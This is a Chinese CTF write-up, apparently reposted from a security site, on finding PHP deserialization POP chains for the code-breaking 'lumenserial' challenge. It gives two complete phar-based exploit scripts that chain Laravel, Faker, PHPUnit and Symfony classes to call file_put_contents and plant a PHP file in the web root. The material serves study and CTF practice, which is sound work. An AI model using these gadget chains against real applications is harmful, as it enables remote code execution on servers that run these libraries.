> 原文链接: https://www.anquanke.com//post/id/170714 


# PHP反序列化入门之寻找POP链（二）


                                阅读量   
                                **197950**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t018cd2b7cfe9dfb035.png)](https://p2.ssl.qhimg.com/t018cd2b7cfe9dfb035.png)



## 前言

> 本文以 [**code-breaking**](https://code-breaking.com/) 中 **lumenserial** 为例，练习PHP反序列化 **POP链** 的寻找，题目地址：[https://code-breaking.com/puzzle/7/](https://code-breaking.com/puzzle/7/) 。

上篇 [文章](http://mochazz.github.io/2019/02/06/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8B%E5%AF%BB%E6%89%BEPOP%E9%93%BE%EF%BC%88%E4%B8%80%EF%BC%89/) ，我们是通过 **PendingBroadcast** 类 **__destruct** 方法中的 **$this-&gt;events-&gt;dispatch** ，然后直接走 **$this-&gt;events** 对象的 **__call** 方法，本文将探索直接走 **$this-&gt;events** 对象 **dispatch** 方法的 **POP链** 。



## POP链一

我们直接搜索 **‘function dispatch(‘** ，发现有一个 **Dispatcher** 类的 **dispatchToQueue** 方法中调用的 **call_user_func** 函数两个参数都可控，而且 **dispatch** 中调用了 **dispatchToQueue** 方法，代码如下：

[![](https://p2.ssl.qhimg.com/t0170bcb8c87d1a35f9.png)](https://p2.ssl.qhimg.com/t0170bcb8c87d1a35f9.png)

从代码中我们可以看到，只要传入的 **$command** 变量是 **ShouldQueue** 类的实例即可。通过搜索，我们会发现 **ShouldQueue** 是一个接口，那么我们找到其实现类即可。直接搜索 **‘implements ShouldQueue’** ，我们随便选取一个实现类即可，这里我选用 **CallQueuedClosure** 类，相关代码如下：

[![](https://p3.ssl.qhimg.com/t01e53311dd0676b490.png)](https://p3.ssl.qhimg.com/t01e53311dd0676b490.png)

现在 **call_user_func** 函数的两个参数都可控，又变成了我们可以调用任意对象的任意方法了，这样我们有可以利用上篇文章中的方法，调用 **ReturnCallback** 类的 **invoke** 方法，并传入 **StaticInvocation** 类的对象作为参数，形成整个完整的 **POP链** ，利用 **exp** 如下：

```
&lt;?php
namespace IlluminateBroadcasting`{`
    class PendingBroadcast`{`
        protected $events;
        protected $event;
        function __construct($events, $event)`{`
            $this-&gt;events = $events;
            $this-&gt;event = $event;
        `}`
    `}`
    class BroadcastEvent`{`
        public $connection;
        public function __construct($connection)
        `{`
            $this-&gt;connection = $connection;
        `}`
    `}`
`}`;
namespace PHPUnitFrameworkMockObjectStub`{`
    class ReturnCallback
    `{`
        private $callback;
        public function __construct($callback)
        `{`
            $this-&gt;callback = $callback;
        `}`
    `}`
`}`;
namespace PHPUnitFrameworkMockObjectInvocation`{`
    class StaticInvocation`{`
        private $parameters;
        public function __construct($parameters)`{`
            $this-&gt;parameters = $parameters;
        `}`
    `}`
`}`;
namespace IlluminateBus`{`
    class Dispatcher`{`
        protected $queueResolver;
        public function __construct($queueResolver)`{`
            $this-&gt;queueResolver = $queueResolver;
        `}`
    `}`
`}`;
namespace`{`
    $function = 'file_put_contents';
    $parameters = array('/var/www/html/11.php','&lt;?php phpinfo();?&gt;');

    $staticinvocation = new PHPUnitFrameworkMockObjectInvocationStaticInvocation($parameters);
    $broadcastevent = new IlluminateBroadcastingBroadcastEvent($staticinvocation);
    $returncallback = new PHPUnitFrameworkMockObjectStubReturnCallback($function);
    $dispatcher = new IlluminateBusDispatcher(array($returncallback,'invoke'));
    $pendingbroadcast = new IlluminateBroadcastingPendingBroadcast($dispatcher,$broadcastevent);
    $o = $pendingbroadcast;

    $filename = 'poc.phar';// 后缀必须为phar，否则程序无法运行
    file_exists($filename) ? unlink($filename) : null;
    $phar=new Phar($filename);
    $phar-&gt;startBuffering();
    $phar-&gt;setStub("GIF89a&lt;?php __HALT_COMPILER(); ?&gt;");
    $phar-&gt;setMetadata($o);
    $phar-&gt;addFromString("foo.txt","bar");
    $phar-&gt;stopBuffering();
`}`;
?&gt;
```

我们再通过下面这张图片，来理清整个 **POP链** 的调用过程。

[![](https://p0.ssl.qhimg.com/t01c44807c6134b9540.png)](https://p0.ssl.qhimg.com/t01c44807c6134b9540.png)



## POP链二

接下来这个 **POP链** 思路是参考 [这篇](http://m4p1e.com/web/20181224.html) 文章，寻找 **POP链** 的思路还是从 **dispatch** 方法入手。在上篇文章中，我们发现第一个 **RCE** 走了 **Generator** 类的 **__call** 方法，这个方法作为 **POP链** 中的一部分极其好用，因为 **call_user_func_array** 方法中的两个参数完全可控。我们只要找到方法中存在形如 **this-&gt;$object-&gt;$method($arg1,$arg2)** ，且 **$object** 、 **$method** 、 **$arg1** 、 **$arg2** 四个参数均可控制，那么就可以利用这个 **Generator** 类的 **__call** 方法，最终调用 **call_user_func_array(‘file_put_contents’,array(‘1.php’,’xxx’))** 。

[![](https://p1.ssl.qhimg.com/t013f8abc3d2c27c87d.png)](https://p1.ssl.qhimg.com/t013f8abc3d2c27c87d.png)

我们继续搜索 **dispatch** ，会发现一个 **TraceableEventDispatcher** 类的 **dispatch** 方法，其代码如下：

[![](https://p3.ssl.qhimg.com/t0160b0de1eddc7a9bb.png)](https://p3.ssl.qhimg.com/t0160b0de1eddc7a9bb.png)

我们发现其调用了 **preProcess** 方法，传入的 **$eventName** 变量是可控的，我们跟进该方法， 具体代码如下：

[![](https://p3.ssl.qhimg.com/t01e64410d8a16e6796.png)](https://p3.ssl.qhimg.com/t01e64410d8a16e6796.png)

可以看到我们得让 **$this-&gt;dispatcher-&gt;hasListeners($eventName)** 返回 **true** ，否则返回的空值对我们无用。然后 **第12行** 的 **getListeners** 方法返回的值得是一个数组，这样我们才能进入 **foreach** 结构里。之所以要进到 **foreach** 结构里，是因为我们在 **第16行** 看到了 **$this-&gt;dispatcher-&gt;removeListener($eventName, $listener)** ，结构形如： **this-&gt;$object-&gt;$method($arg1,$arg2)** ，前三个参数可以按照如下构造：

```
this-&gt;$object =  new FakerGenerator();
this-&gt;$object-&gt;$method = 'removeListener';
arg1 = '/var/www/html/1.php';
this-&gt;formatters['removeListener'] = 'file_put_contents';
```

这样子构造之后，执行到 **$this-&gt;dispatcher-&gt;removeListener($eventName, $listener)** 时，就会调用 **Generator** 类的 **__call** 方法，继而执行 **call_user_func_array(‘file_put_contents’,array(‘/var/www/html/upload/1.php’,$listener))** ，所以我们只要再确保第四个参数 **$listener** 可控即可。

现在我们再回到上面 **第6行** 的 **if** 语句，我们需要先绕过这个判断条件。该代码会调用 **FakerGenerator** 类的 **hasListeners** 方法，进而触发 **__call** 方法，那么我们只要将 **this-&gt;formatters[‘hasListeners’]** 设置成 **‘strlen’** 即可，之后就会调用 **call_user_func_array(‘strlen’,’var/www/html’)** ，这样就可以绕过 **if** 语句。

j接着我们再回到 **foreach** 语句，继续搜索可利用的 **getListeners** 方法，看看是否可以返回一个可控数组（返回数组才能进入 **foreach** 语句）。通过搜索，我们会发现一个 **Dispatcher** 类的 **getListeners** 符合我们的要求，其具体代码如下：

[![](https://p5.ssl.qhimg.com/t014acc93490c733c64.png)](https://p5.ssl.qhimg.com/t014acc93490c733c64.png)

此时 **$eventName** 是我们传入的 **‘/var/www/html/upload/1.php’** ，很明显上面的代码中可以返回一个数组，而且数组的值完全可控。

刚才 **foreach** 中的 **$this-&gt;dispatcher-&gt;getListeners()** 调用的是 **FakerGenerator** 类的 **getListeners** 方法，现在我们要想办法让它调用 **Dispatcher** 类的 **getListeners** 方法。我们再看一下刚才 **Generator** 的调用流程图：

[![](https://p3.ssl.qhimg.com/t013f8abc3d2c27c87d.png)](https://p3.ssl.qhimg.com/t013f8abc3d2c27c87d.png)

可以看到只要我们将 **this-&gt;providers** 设置为 **array(Dispatcher类)** 即可，之后的调用就类似于 **call_user_func_array(array(Dispatcher类,’getListeners’),’/var/www/html/1.php’)** 。

现在基本完成了整个利用链，不过在执行到 **$this-&gt;dispatcher-&gt;removeListener($eventName, $listener)** 之前，还有一些额外的代码需要执行，我们要确保这些代码不会影响我们下面的方法，所以我们需要继续看 **foreach** 下面的代码（这里说的是 **TraceableEventDispatcher** 类 **preProcess** 方法中的 **foreach** ）。

我们看到其调用了本类的 **getListenerPriority** 方法，具体代码如下：

[![](https://p1.ssl.qhimg.com/t019cddb356d11063c3.png)](https://p1.ssl.qhimg.com/t019cddb356d11063c3.png)

我们看到 **第16行** ，返回 **$this-&gt;dispatcher-&gt;getListenerPriority($eventName, $listener)** ，简直完美。我们可以不用执行到刚才的 **removeListener** 方法，直接到这里就可以完成整个 **POP链** 了。最终的利用 **exp** 如下：

```
&lt;?php
namespace IlluminateEvents`{`
    class Dispatcher`{`
        protected $listeners;
        protected $wildcardsCache;
        public function __construct($parameter,$function)`{`
            $this-&gt;listeners[$parameter['filename']] = array($parameter['contents']);
        `}`
    `}`
`}`;
namespace Faker`{`
    class Generator`{`
        protected $providers;
        protected $formatters;
        public function __construct($providers,$formatters)`{`
            $this-&gt;providers = $providers;
            $this-&gt;formatters = $formatters;
        `}`
    `}`
`}`;
namespace SymfonyComponentEventDispatcherDebug`{`
    class TraceableEventDispatcher`{`
        private $dispatcher;
        public function __construct($dispatcher)`{`
            $this-&gt;dispatcher = $dispatcher;
        `}`
    `}`
`}`;
namespace IlluminateBroadcasting`{`
    class PendingBroadcast`{`
        protected $events;
        protected $event;
        public function __construct($events, $parameter)`{`
            $this-&gt;events = $events;
            $this-&gt;event = $parameter['filename'];
        `}`
    `}`
`}`

namespace `{`
    $function = 'file_put_contents';
    $parameters = array('filename' =&gt; '/var/www/html/1.php','contents' =&gt; '&lt;?php phpinfo();?&gt;');

    $dispatcher = new IlluminateEventsDispatcher($parameters,$function);
    $generator = new FakerGenerator([$dispatcher],['hasListeners'=&gt;'strlen','getListenerPriority'=&gt;$function]);
    $traceableeventdispatcher = new SymfonyComponentEventDispatcherDebugTraceableEventDispatcher($generator);
    $pendingbroadcast = new IlluminateBroadcastingPendingBroadcast($traceableeventdispatcher,$parameters);
    $o = $pendingbroadcast;

    $filename = 'poc.phar';// 后缀必须为phar，否则程序无法运行
    file_exists($filename) ? unlink($filename) : null;
    $phar=new Phar($filename);
    $phar-&gt;startBuffering();
    $phar-&gt;setStub("GIF89a&lt;?php __HALT_COMPILER(); ");
    $phar-&gt;setMetadata($o);
    $phar-&gt;addFromString("foo.txt","bar");
    $phar-&gt;stopBuffering();
`}`
?&gt;
```

我们再通过下面这张图片，来理清整个 **POP链** 的调用过程。

[![](https://p2.ssl.qhimg.com/t01cc6e67c4f4dd13be.png)](https://p2.ssl.qhimg.com/t01cc6e67c4f4dd13be.png)



## 参考

[Code Breaking 挑战赛 — lumenserial](http://m4p1e.com/web/20181224.html)
